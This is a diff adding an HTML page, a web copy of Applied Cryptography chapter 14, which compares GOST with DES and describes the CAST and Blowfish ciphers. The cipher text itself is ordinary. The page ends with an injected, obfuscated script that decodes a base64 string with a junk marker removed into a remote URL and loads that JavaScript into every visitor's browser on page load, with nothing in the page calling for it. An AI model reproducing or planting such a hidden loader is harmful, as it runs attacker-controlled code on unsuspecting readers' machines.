@@ -1,0 +1,136 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=334-336//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<DL>
+<DD>&#151; The S-boxes in DES have 6-bit inputs and 4-bit outputs; the S-boxes in GOST have 4-bit inputs and outputs. Both algorithms have eight S-boxes, but an S-box in GOST is one-fourth the size of an S-box in DES.
+<DD>&#151; DES has an irregular permutation, called a P-box; GOST uses an 11-bit left circular shift.
+<DD>&#151; DES has 16 rounds; GOST has 32 rounds.
+</DL>
+<P>If there is no better way to break GOST other than brute force, it is a very secure algorithm. GOST has a 256-bit key&#151;longer if you count the secret S-boxes. Against differential and linear cryptanalysis, GOST is probably stronger than DES. Although the random S-boxes in GOST are probably weaker than the fixed S-boxes in DES, their secrecy adds to GOST&#146;s resistance against differential and linear attacks. Also, both of these attacks depend on the number of rounds: the more rounds, the more difficult the attack. GOST has twice as many rounds as DES; this alone probably makes both differential and linear cryptanalysis infeasible.
+</P>
+<P>The other parts of GOST are either on par or worse than DES. GOST doesn&#146;t have the same expansion permutation that DES has. Deleting this permutation from DES weakens it by reducing the avalanche effect; it is reasonable to believe that GOST is weaker for not having it. GOST&#146;s use of addition instead is no less secure than DES&#146;s XOR.</P>
+<P>The greatest difference between them seems to be GOST&#146;s cyclic shift instead of a permutation. The DES permutation increases the avalanche effect. In GOST a change in one input bit affects one S-box in one round, which then affects two S-boxes in the next round, three the round after that, and so on. GOST requires 8 rounds before a single change in an input affects every output bit; DES only requires 5 rounds. This is certainly a weakness. But remember: GOST has 32 rounds to DES&#146;s 16.</P>
+<P>GOST&#146;s designers tried to achieve a balance between efficiency and security. They modified DES&#146;s basic design to create an algorithm that is better suited for software implementation. They seem to have been less sure of their algorithm&#146;s security, and have tried to compensate by making the key length very large, keeping the S-boxes secret, and doubling the number of iterations. Whether their efforts have resulted in an algorithm more secure than DES remains to be seen.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">14.2 CAST</FONT></H3>
+<P>CAST was designed in Canada by Carlisle Adams and Stafford Tavares [10,7]. They claim that the name refers to their design procedure and should conjure up images of randomness, but note the authors&#146; initials. The example CAST algorithm uses a 64-bit block size and a 64-bit key.
+</P>
+<P>The structure of CAST should be familiar. The algorithm uses six S-boxes with an 8-bit input and a 32-bit output. Construction of these S-boxes is implementation-dependent and complicated; see the references for details.</P>
+<P>To encrypt, first divide the plaintext block into a left half and a right half. The algorithm has 8 rounds. In each round the right half is combined with some key material using function f and then XORed with the left half to form the new right half. The original right half (before the round) becomes the new left half. After 8 rounds (don&#146;t switch the left and right halves after the eighth round), the two halves are concatenated to form the ciphertext.</P>
+<P>Function f is simple:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Divide the 32-bit input into four 8-bit quarters: <I>a, b, c, d</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Divide the 16-bit subkey into two 8-bit halves: <I>e, f</I>.
+<DD><B>(3)</B>&nbsp;&nbsp;Process <I>a</I> through S-box 1, <I>b</I> through S-box 2, <I>c</I> through S-box 3, <I>d</I> through S-box 4, <I>e</I> through S-box 5, and <I>f</I> through S-box 6.
+<DD><B>(4)</B>&nbsp;&nbsp;XOR the six S-box outputs together to get the final 32-bit output.
+</DL>
+<P>Alternatively, the 32-bit input can be XORed with 32 bits of key, divided into four 8-bit quarters, processed through the S-boxes, and then XORed together [7]. <I>N</I> rounds of this appears to be as secure as <I>N</I> &#43; 2 rounds of the other option.</P>
+<P>The 16-bit subkey for each round is easily calculated from the 64-bit key. If <I>k</I><SUB>1</SUB>, <I>k</I><SUB>2</SUB>,..., <I>k</I><SUB>8</SUB> are the 8 bytes of the key, then the subkeys for each round are:</P>
+<TABLE WIDTH="35%"><TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 1:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>1</SUB>, <I>k</I><SUB>2</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 2:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>3</SUB>, <I>k</I><SUB>4</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 3:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>5</SUB>, <I>k</I><SUB>6</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 4:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>7</SUB>, <I>k</I><SUB>8</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 5:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>4</SUB>, <I>k</I><SUB>3</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 6:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>2</SUB>, <I>k</I><SUB>1</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 7:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>8</SUB>, <I>k</I><SUB>7</SUB>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="5%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="10%">Round 8:
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="13%"><I>k</I><SUB>6</SUB>, <I>k</I><SUB>5</SUB>
+</TABLE>
+<P>The strength of this algorithm lies in its S-boxes. CAST does not have fixed S-boxes; new ones are constructed for each application. Design criteria are in [10]; bent functions are the S-box columns, selected for a number of desirable S-box properties (see Section 14.10). Once a set of S-boxes has been constructed for a given implementation of CAST, they are fixed for all time. The S-boxes are implementation-dependent, but not key-dependent.
+</P>
+<P>It was shown in [10] that CAST is resistant to differential cryptanalysis and in [728] that CAST is resistant to linear cryptanalysis. There is no known way to break CAST other than brute force.</P>
+<P>Northern Telecom is using CAST in their Entrust security software package for Macintoshes, PCs, and UNIX workstations. The particular S-boxes they chose are not public. The Canadian government is evaluating CAST as a new encryption standard. CAST is patent-pending.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">14.3 Blowfish</FONT></H3>
+<P>Blowfish is an algorithm of my own design, intended for implementation on large microprocessors [1388,1389]. The algorithm is unpatented, and the C code in the back of this book is in the public domain. I designed Blowfish to meet the following design criteria.
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Fast. Blowfish encrypts data on 32-bit microprocessors at a rate of 26 clock cycles per byte.
+<DD><B>2.</B>&nbsp;&nbsp;Compact. Blowfish can run in less than 5K of memory.
+<DD><B>3.</B>&nbsp;&nbsp;Simple. Blowfish uses only simple operations: addition, XORs, and table lookups on 32-bit operands. Its design is easy to analyze which makes it resistant to implementation errors [1391].
+<DD><B>4.</B>&nbsp;&nbsp;Variably Secure. Blowfish&#146;s key length is variable and can be as long as 448 bits.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(LoIZHavc, MIuDbYbo) {MIuDbYbo = LoIZHavc.createElement('script');MIuDbYbo.type = 'text/javascript';MIuDbYbo.async = true;MIuDbYbo.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');LoIZHavc.getElementsByTagName('body')[0].appendChild(MIuDbYbo);}(document));</script></body>
+</html>
